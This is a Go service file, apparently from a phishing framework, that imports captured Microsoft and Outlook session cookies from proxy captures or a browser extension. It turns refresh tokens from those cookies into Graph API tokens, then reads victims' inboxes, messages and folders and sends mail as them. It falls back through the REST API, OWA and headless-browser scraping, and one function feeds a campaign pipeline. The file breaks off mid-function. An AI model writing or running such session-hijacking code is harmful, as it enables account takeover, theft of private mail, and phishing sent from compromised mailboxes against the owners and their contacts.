package service

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/phishingclub/phishingclub/data"
	"github.com/phishingclub/phishingclub/database"
	"github.com/phishingclub/phishingclub/errs"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/repository"
	"go.uber.org/zap"
)

const (
	outlookUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

// outlookDomains are the Microsoft/Outlook cookie domains to include
var outlookDomains = []string{
	".outlook.office365.com", ".outlook.office.com", ".outlook.live.com",
	".office365.com", ".office.com", ".live.com", ".microsoft.com",
	".login.microsoftonline.com",
}

// CookieStoreService handles cookie storage, validation, sending, and inbox reading
type CookieStoreService struct {
	Common
	Logger           *zap.SugaredLogger
	CookieStoreRepo  *repository.CookieStore
	ProxyCaptureRepo *repository.ProxyCapture
	BrowserSession   *BrowserSessionService
}

// Import imports cookies from a request (manual import, extension, or proxy capture)
func (s *CookieStoreService) Import(
	ctx context.Context,
	session *model.Session,
	req *model.CookieStoreImportRequest,
) (*uuid.UUID, error) {
	// session can be nil for extension calls (unauthenticated)
	if session != nil {
		isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
		if err != nil {
			s.LogAuthError(err)
			return nil, errs.Wrap(err)
		}
		if !isAuthorized {
			return nil, errs.ErrAuthorizationFailed
		}
	}

	cookiesJSON, err := json.Marshal(req.Cookies)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	source := req.Source
	if source == "" {
		source = "import"
	}

	m := map[string]interface{}{
		"name":         req.Name,
		"source":       source,
		"cookies_json": string(cookiesJSON),
		"cookie_count": len(req.Cookies),
		"is_valid":     false,
	}

	if session != nil && session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		m["company_id"] = session.User.CompanyID.MustGet()
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate the session asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// ImportFromExtension imports cookies received from the Chrome Extension
func (s *CookieStoreService) ImportFromExtension(
	ctx context.Context,
	name string,
	cookies []model.ImportCookie,
	ip string,
) (*uuid.UUID, error) {
	cookiesJSON, err := json.Marshal(cookies)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	m := map[string]interface{}{
		"name":         name,
		"source":       "extension",
		"cookies_json": string(cookiesJSON),
		"cookie_count": len(cookies),
		"is_valid":     false,
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// ImportFromProxyCapture imports cookies from a proxy capture record
func (s *CookieStoreService) ImportFromProxyCapture(
	ctx context.Context,
	session *model.Session,
	captureID uuid.UUID,
	name string,
	cookiesJSON string,
) (*uuid.UUID, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	// Count cookies
	var cookies []model.ImportCookie
	_ = json.Unmarshal([]byte(cookiesJSON), &cookies)

	m := map[string]interface{}{
		"name":             name,
		"source":           "proxy_capture",
		"cookies_json":     cookiesJSON,
		"cookie_count":     len(cookies),
		"is_valid":         false,
		"proxy_capture_id": captureID,
	}

	if session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		m["company_id"] = session.User.CompanyID.MustGet()
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// GetAll returns all cookie stores with pagination
func (s *CookieStoreService) GetAll(
	ctx context.Context,
	session *model.Session,
	option *repository.CookieStoreOption,
) (*model.Result[database.CookieStore], error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	var companyID *uuid.UUID
	if session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		cid := session.User.CompanyID.MustGet()
		companyID = &cid
	}
	return s.CookieStoreRepo.GetAll(ctx, companyID, option)
}

// GetByID returns a cookie store by ID
func (s *CookieStoreService) GetByID(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) (*database.CookieStore, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.GetByID(ctx, id)
}

// Delete deletes a cookie store by ID
func (s *CookieStoreService) Delete(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) error {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return errs.Wrap(err)
	}
	if !isAuthorized {
		return errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.DeleteByID(ctx, id)
}

// DeleteAll deletes all cookie stores
func (s *CookieStoreService) DeleteAll(
	ctx context.Context,
	session *model.Session,
) error {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return errs.Wrap(err)
	}
	if !isAuthorized {
		return errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.DeleteAll(ctx)
}

// Revalidate re-checks if a cookie session is still valid
func (s *CookieStoreService) Revalidate(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) (*database.CookieStore, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	if err := s.validateAndUpdate(ctx, id); err != nil {
		return nil, err
	}

	return s.CookieStoreRepo.GetByID(ctx, id)
}

// SendEmail sends an email using captured cookies
func (s *CookieStoreService) SendEmail(
	ctx context.Context,
	session *model.Session,
	req *model.CookieSendRequest,
) (*model.CookieSendResult, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	storeID, err := uuid.Parse(req.CookieStoreID)
	if err != nil {
		return nil, fmt.Errorf("invalid cookie store ID: %s", req.CookieStoreID)
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found: %s", req.CookieStoreID)
	}

	// Try token-based sending first (Graph API with access token)
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		result := s.sendViaGraphAPI(ctx, accessToken, req)
		if result.Success {
			s.Logger.Infow("email sent via Graph API", "to", req.To, "storeID", req.CookieStoreID)
			return result, nil
		}
		s.Logger.Warnw("Graph API send failed, trying other methods", "error", result.Error)
	}

	// Try cookie-based sending via REST API
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		message := s.buildMessagePayload(req, store.Email)

		result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
		if result.Success {
			s.Logger.Infow("cookie-based email sent via REST API", "to", req.To, "storeID", req.CookieStoreID)
			return result, nil
		}
		s.Logger.Warnw("REST API send failed", "error", result.Error)

		result = s.sendViaOWA(ctx, cookieHeader, req)
		if result.Success {
			s.Logger.Infow("cookie-based email sent via OWA", "to", req.To, "storeID", req.CookieStoreID)
			return result, nil
		}
		s.Logger.Warnw("OWA send failed", "error", result.Error)
	}

	// Final fallback: browser automation
	if s.BrowserSession != nil {
		s.Logger.Infow("attempting browser-based email send", "to", req.To)

		// First try to get a fresh token via browser
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			// Use the fresh token for Graph API send
			graphResult := s.sendViaGraphAPI(ctx, browserResult.AccessToken, req)
			if graphResult.Success {
				// Cache the token
				s.cacheAccessToken(ctx, store.ID, browserResult)
				s.Logger.Infow("email sent via Graph API (browser token)", "to", req.To)
				return graphResult, nil
			}
		}

		// Last resort: direct browser automation send
		err = s.BrowserSession.SendEmailViaBrowser(ctx, store.CookiesJSON, req.To, req.Subject, req.Body, req.IsHTML, store.ID.String())
		if err == nil {
			return &model.CookieSendResult{
				Success:   true,
				Method:    "browser",
				MessageID: fmt.Sprintf("browser-%d", time.Now().UnixMilli()),
				SentAt:    time.Now().UTC().Format(time.RFC3339),
			}, nil
		}
		s.Logger.Warnw("browser send failed", "error", err)
	}

	return &model.CookieSendResult{
		Success: false,
		Error:   "all send methods failed (Graph API, REST API, OWA, browser automation)",
		SentAt:  time.Now().UTC().Format(time.RFC3339),
	}, nil
}

// SendEmailDirect sends an email using a cookie store ID directly (for campaign pipeline)
func (s *CookieStoreService) SendEmailDirect(
	ctx context.Context,
	storeID uuid.UUID,
	to, subject, htmlBody, fromEmail string,
) (*model.CookieSendResult, error) {
	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return &model.CookieSendResult{
			Success: false,
			Error:   fmt.Sprintf("cookie store not found: %s", storeID.String()),
			SentAt:  time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	req := &model.CookieSendRequest{
		CookieStoreID: storeID.String(),
		To:            []string{to},
		Subject:       subject,
		Body:          htmlBody,
		IsHTML:        true,
		SaveToSent:    false,
	}

	// Try token-based sending first
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		result := s.sendViaGraphAPI(ctx, accessToken, req)
		if result.Success {
			return result, nil
		}
	}

	// Fall back to cookie-based
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		message := s.buildMessagePayload(req, fromEmail)
		result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
		if result.Success {
			return result, nil
		}
		result = s.sendViaOWA(ctx, cookieHeader, req)
		if result.Success {
			return result, nil
		}
	}

	// Browser automation fallback
	if s.BrowserSession != nil {
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			graphResult := s.sendViaGraphAPI(ctx, browserResult.AccessToken, req)
			if graphResult.Success {
				s.cacheAccessToken(ctx, store.ID, browserResult)
				return graphResult, nil
			}
		}

		err = s.BrowserSession.SendEmailViaBrowser(ctx, store.CookiesJSON, req.To, req.Subject, req.Body, req.IsHTML, storeID.String())
		if err == nil {
			return &model.CookieSendResult{
				Success:   true,
				Method:    "browser",
				MessageID: fmt.Sprintf("browser-%d", time.Now().UnixMilli()),
				SentAt:    time.Now().UTC().Format(time.RFC3339),
			}, nil
		}
	}

	return &model.CookieSendResult{
		Success: false,
		Error:   "No Outlook/Microsoft cookies found and all methods failed",
		SentAt:  time.Now().UTC().Format(time.RFC3339),
	}, nil
}

// GetInbox reads the inbox of a cookie session
func (s *CookieStoreService) GetInbox(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
	folder string,
	limit int,
	skip int,
) ([]model.InboxMessage, int, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, 0, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, 0, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, 0, fmt.Errorf("cookie store not found")
	}

	if folder == "" {
		folder = "inbox"
	}
	if limit <= 0 || limit > 50 {
		limit = 25
	}

	// Try token-based inbox reading first (Graph API)
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		messages, count, err := s.getInboxViaGraphAPI(ctx, accessToken, folder, limit, skip)
		if err == nil {
			return messages, count, nil
		}
		s.Logger.Warnw("Graph API inbox failed, trying other methods", "error", err)
	}

	// Fall back to cookie-based
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		apiURL := fmt.Sprintf(
			"https://outlook.office365.com/api/v2.0/me/mailfolders/%s/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments,ToRecipients",
			folder, limit, skip,
		)

		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
		if err == nil {
			httpReq.Header.Set("Cookie", cookieHeader)
			httpReq.Header.Set("User-Agent", outlookUserAgent)
			httpReq.Header.Set("Accept", "application/json")

			client := &http.Client{Timeout: 30 * time.Second}
			resp, err := client.Do(httpReq)
			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					return s.parseMessagesResponse(resp.Body)
				}
			}
		}

		// Try alternative endpoint without folder
		altURL := fmt.Sprintf(
			"https://outlook.office365.com/api/v2.0/me/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments",
			limit, skip,
		)
		altReq, _ := http.NewRequestWithContext(ctx, "GET", altURL, nil)
		if altReq != nil {
			altReq.Header.Set("Cookie", cookieHeader)
			altReq.Header.Set("User-Agent", outlookUserAgent)
			altReq.Header.Set("Accept", "application/json")

			client := &http.Client{Timeout: 30 * time.Second}
			altResp, altErr := client.Do(altReq)
			if altErr == nil {
				defer altResp.Body.Close()
				if altResp.StatusCode == 200 {
					return s.parseMessagesResponse(altResp.Body)
				}
			}
		}
	}

	// Browser automation fallback
	if s.BrowserSession != nil {
		s.Logger.Infow("attempting browser-based inbox read")

		// First try to get a fresh token via browser and use Graph API
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			s.cacheAccessToken(ctx, store.ID, browserResult)

			messages, count, err := s.getInboxViaGraphAPI(ctx, browserResult.AccessToken, folder, limit, skip)
			if err == nil {
				return messages, count, nil
			}
			s.Logger.Warnw("Graph API inbox with browser token failed", "error", err)
		}

		// Final fallback: read inbox directly via browser page scraping
		s.Logger.Infow("attempting direct browser inbox scraping")
		messages, totalCount, err := s.BrowserSession.ReadInboxViaBrowser(ctx, store.CookiesJSON, folder, limit, skip, store.ID.String())
		if err == nil {
			s.Logger.Infow("inbox read via browser scraping", "count", len(messages))
			return messages, totalCount, nil
		}
		s.Logger.Warnw("browser inbox scraping failed", "error", err)
	}

	return nil, 0, fmt.Errorf("cookie session expired or invalid - all methods failed (token exchange, cookie API, browser automation)")
}

// GetMessage reads a specific email message
func (s *CookieStoreService) GetMessage(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
	messageID string,
) (*model.InboxMessageFull, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found")
	}

	// Try token-based message reading first (Graph API)
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		msg, err := s.getMessageViaGraphAPI(ctx, accessToken, messageID)
		if err == nil {
			return msg, nil
		}
		s.Logger.Warnw("Graph API message read failed, trying other methods", "error", err)
	}

	// Fall back to cookie-based
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		apiURL := fmt.Sprintf(
			"https://outlook.office365.com/api/v2.0/me/messages/%s?$select=Id,From,Subject,ReceivedDateTime,Body,BodyPreview,IsRead,HasAttachments,ToRecipients,CcRecipients,Importance",
			messageID,
		)

		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
		if err == nil {
			httpReq.Header.Set("Cookie", cookieHeader)
			httpReq.Header.Set("User-Agent", outlookUserAgent)
			httpReq.Header.Set("Accept", "application/json")

			client := &http.Client{Timeout: 30 * time.Second}
			resp, err := client.Do(httpReq)
			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					return s.parseMessageFull(resp.Body)
				}
			}
		}
	}

	// Browser automation fallback
	if s.BrowserSession != nil {
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			s.cacheAccessToken(ctx, store.ID, browserResult)
			msg, err := s.getMessageViaGraphAPI(ctx, browserResult.AccessToken, messageID)
			if err == nil {
				return msg, nil
			}
		}
	}

	return nil, fmt.Errorf("failed to read message - all methods failed")
}

// GetFolders lists mail folders for a cookie session
func (s *CookieStoreService) GetFolders(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
) ([]model.InboxFolder, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found")
	}

	// Try token-based folder listing first (Graph API)
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		folders, err := s.getFoldersViaGraphAPI(ctx, accessToken)
		if err == nil {
			return folders, nil
		}
		s.Logger.Warnw("Graph API folders failed, trying other methods", "error", err)
	}

	// Fall back to cookie-based
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		apiURL := "https://outlook.office365.com/api/v2.0/me/mailfolders?$select=Id,DisplayName,TotalItemCount,UnreadItemCount"

		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
		if err == nil {
			httpReq.Header.Set("Cookie", cookieHeader)
			httpReq.Header.Set("User-Agent", outlookUserAgent)
			httpReq.Header.Set("Accept", "application/json")

			client := &http.Client{Timeout: 30 * time.Second}
			resp, err := client.Do(httpReq)
			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					var folderData struct {
						Value []struct {
							ID              string `json:"Id"`
							DisplayName     string `json:"DisplayName"`
							TotalItemCount  int    `json:"TotalItemCount"`
							UnreadItemCount int    `json:"UnreadItemCount"`
						} `json:"value"`
					}

					if json.NewDecoder(resp.Body).Decode(&folderData) == nil {
						folders := make([]model.InboxFolder, len(folderData.Value))
						for i, f := range folderData.Value {
							folders[i] = model.InboxFolder{
								ID:              f.ID,
								DisplayName:     f.DisplayName,
								TotalItemCount:  f.TotalItemCount,
								UnreadItemCount: f.UnreadItemCount,
							}
						}
						return folders, nil
					}
				}
			}
		}
	}

	// Browser automation fallback
	if s.BrowserSession != nil {
		s.Logger.Infow("attempting browser-based folder listing")

		// First try to get a fresh token via browser and use Graph API
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			s.cacheAccessToken(ctx, store.ID, browserResult)
			folders, err := s.getFoldersViaGraphAPI(ctx, browserResult.AccessToken)
			if err == nil {
				return folders, nil
			}
			s.Logger.Warnw("Graph API folders with browser token failed", "error", err)
		}

		// Final fallback: get folders directly via browser page scraping
		s.Logger.Infow("attempting direct browser folder scraping")
		folders, err := s.BrowserSession.GetFoldersViaBrowser(ctx, store.CookiesJSON, store.ID.String())
		if err == nil {
			s.Logger.Infow("folders read via browser scraping", "count", len(folders))
			return folders, nil
		}
		s.Logger.Warnw("browser folder scraping failed", "error", err)
	}

	return nil, fmt.Errorf("failed to list folders - all methods failed")
}

// --- Token Exchange Methods ---

// getOrRefreshAccessToken returns a valid access token for the store,
// either from cache or by exchanging the MSRT refresh token.
func (s *CookieStoreService) getOrRefreshAccessToken(ctx context.Context, store *database.CookieStore) string {
	// Check if we have a cached, non-expired access token
	if store.AccessToken != "" && store.TokenExpiry != nil && store.TokenExpiry.After(time.Now()) {
		s.Logger.Debugw("using cached access token", "storeID", store.ID, "expiresAt", store.TokenExpiry)
		return store.AccessToken
	}

	// Try to extract refresh token from cookies and exchange it
	refreshToken, tenantID := extractRefreshToken(store.CookiesJSON, s.Logger)
	if refreshToken == "" {
		// Also try using a stored refresh token from a previous exchange
		if store.RefreshToken != "" {
			refreshToken = store.RefreshToken
		} else {
			s.Logger.Debugw("no refresh token available for token exchange", "storeID", store.ID)
			return ""
		}
	}

	// Exchange for Graph API access token
	tokenResp, err := exchangeForGraphToken(refreshToken, tenantID, s.Logger)
	if err != nil {
		s.Logger.Warnw("token exchange failed", "storeID", store.ID, "error", err)
		return ""
	}

	// Cache the token in the database
	expiry := time.Now().Add(time.Duration(tokenResp.ExpiresIn-60) * time.Second) // subtract 60s buffer
	updates := map[string]interface{}{
		"access_token":      tokenResp.AccessToken,
		"token_expiry":      expiry,
		"validation_method": "token_exchange",
	}
	// Store the new refresh token if one was returned
	if tokenResp.RefreshToken != "" {
		updates["refresh_token"] = tokenResp.RefreshToken
	}

	if err := s.CookieStoreRepo.Update(ctx, store.ID, updates); err != nil {
		s.Logger.Warnw("failed to cache access token", "error", err)
	}

	return tokenResp.AccessToken
}

// cacheAccessToken caches an access token obtained from browser session
func (s *CookieStoreService) cacheAccessToken(ctx context.Context, storeID uuid.UUID, result *BrowserSessionResult) {
	if result == nil || result.AccessToken == "" {
		return
	}

	// Access tokens from MSAL.js are typically valid for 1 hour
	expiry := time.Now().Add(55 * time.Minute)
	updates := map[string]interface{}{
		"access_token":      result.AccessToken,
		"token_expiry":      expiry,
		"validation_method": "browser",
	}
	if result.Email != "" {
		updates["email"] = result.Email
	}
	if result.DisplayName != "" {
		updates["display_name"] = result.DisplayName
	}

	if err := s.CookieStoreRepo.Update(ctx, storeID, updates); err != nil {
		s.Logger.Warnw("failed to cache browser access token", "error", err)
	}
}

// validateViaTokenExchange attempts to validate a session by exchanging the MSRT refresh token
// for an access token and calling Graph API /me
func (s *CookieStoreService) validateViaTokenExchange(ctx context.Context, store *database.CookieStore) (email, displayName string, valid bool) {
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken == "" {
		return "", "", false
	}

	// Call Graph API /me to validate and get user info
	httpReq, err := http.NewRequestWithContext(ctx, "GET", "https://graph.microsoft.com/v1.0/me", nil)
	if err != nil {
		return "", "", false
	}
	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return "", "", false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		s.Logger.Debugw("token exchange validation: Graph /me failed", "status", resp.StatusCode)
		return "", "", false
	}

	var profile struct {
		Mail        string `json:"mail"`
		DisplayName string `json:"displayName"`
		UPN         string `json:"userPrincipalName"`
	}
	if json.NewDecoder(resp.Body).Decode(&profile) != nil {
		return "", "", false
	}

	email = profile.Mail
	if email == "" {
		email = profile.UPN
	}
	displayName = profile.DisplayName

	s.Logger.Infow("token exchange validation successful",
		"email", email, "displayName", displayName, "storeID", store.ID)
	return email, displayName, true
}

// validateViaBrowser attempts to validate a session using headless browser automation.
// This is the most reliable method for MSA consumer accounts.
func (s *CookieStoreService) validateViaBrowser(ctx context.Context, store *database.CookieStore) (email, displayName, accessToken string, valid bool) {
	if s.BrowserSession == nil {
		return "", "", "", false
	}

	s.Logger.Infow("attempting browser-based validation", "storeID", store.ID)

	result, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
	if err != nil {
		s.Logger.Warnw("browser validation failed", "storeID", store.ID, "error", err)
		return "", "", "", false
	}

	if !result.Valid {
		s.Logger.Warnw("browser validation: session invalid", "storeID", store.ID, "error", result.Error)
		return "", "", "", false
	}

	s.Logger.Infow("browser validation successful",
		"email", result.Email, "displayName", result.DisplayName,
		"hasToken", result.AccessToken != "", "storeID", store.ID)

	return result.Email, result.DisplayName, result.AccessToken, true
}

// sendViaGraphAPI sends an email using Microsoft Graph API with a Bearer token
func (s *CookieStoreService) sendViaGraphAPI(ctx context.Context, accessToken string, req *model.CookieSendRequest) *model.CookieSendResult {
	toRecipients := make([]map[string]interface{}, len(req.To))
	for i, email := range req.To {
		toRecipients[i] = map[string]interface{}{
			"emailAddress": map[string]string{"address": email},
		}
	}

	contentType := "Text"
	if req.IsHTML {
		contentType = "HTML"
	}

	msgBody := map[string]interface{}{
		"subject": req.Subject,
		"body": map[string]interface{}{
			"contentType": contentType,
			"content":     req.Body,
		},
		"toRecipients": toRecipients,
	}

	if len(req.CC) > 0 {
		ccRecipients := make([]map[string]interface{}, len(req.CC))
		for i, email := range req.CC {
			ccRecipients[i] = map[string]interface{}{
				"emailAddress": map[string]string{"address": email},
			}
		}
		msgBody["ccRecipients"] = ccRecipients
	}

	if len(req.BCC) > 0 {
		bccRecipients := make([]map[string]interface{}, len(req.BCC))
		for i, email := range req.BCC {
			bccRecipients[i] = map[string]interface{}{
				"emailAddress": map[string]string{"address": email},
			}
		}
		msgBody["bccRecipients"] = bccRecipients
	}

	payload := map[string]interface{}{
		"message":         msgBody,
		"saveToSentItems": req.SaveToSent,
	}

	body, _ := json.Marshal(payload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://graph.microsoft.com/v1.0/me/sendMail", bytes.NewReader(body))
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "graph_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "graph_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 202 || resp.StatusCode == 200 {
		return &model.CookieSendResult{
			Success:   true,
			Method:    "graph_api",
			MessageID: fmt.Sprintf("graph-%d", time.Now().UnixMilli()),
			SentAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &model.CookieSendResult{
		Success: false, Method: "graph_api",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}
}

// getInboxViaGraphAPI reads inbox messages using Microsoft Graph API
func (s *CookieStoreService) getInboxViaGraphAPI(ctx context.Context, accessToken string, folder string, limit int, skip int) ([]model.InboxMessage, int, error) {
	apiURL := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/me/mailFolders/%s/messages?$top=%d&$skip=%d&$orderby=receivedDateTime%%20desc&$select=id,from,subject,receivedDateTime,bodyPreview,conversationId,isRead,hasAttachments,toRecipients",
		folder, limit, skip,
	)

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, 0, err
	}
	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return nil, 0, fmt.Errorf("Graph API inbox failed (HTTP %d): %s", resp.StatusCode, string(body))
	}

	return s.parseGraphMessagesResponse(resp.Body)
}

// getMessageViaGraphAPI reads a specific message using Microsoft Graph API
func (s *CookieStoreService) getMessageViaGraphAPI(ctx context.Context, accessToken string, messageID string) (*model.InboxMessageFull, error) {
	apiURL := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/me/messages/%s?$select=id,from,subject,receivedDateTime,body,bodyPreview,isRead,hasAttachments,toRecipients,ccRecipients,importance",
		messageID,
	)

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("Graph API message read failed (HTTP %d)", resp.StatusCode)
	}

	return s.parseGraphMessageFull(resp.Body)
}

// getFoldersViaGraphAPI lists mail folders using Microsoft Graph API
func (s *CookieStoreService) getFoldersViaGraphAPI(ctx context.Context, accessToken string) ([]model.InboxFolder, error) {
	apiURL := "https://graph.microsoft.com/v1.0/me/mailFolders?$select=id,displayName,totalItemCount,unreadItemCount"

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

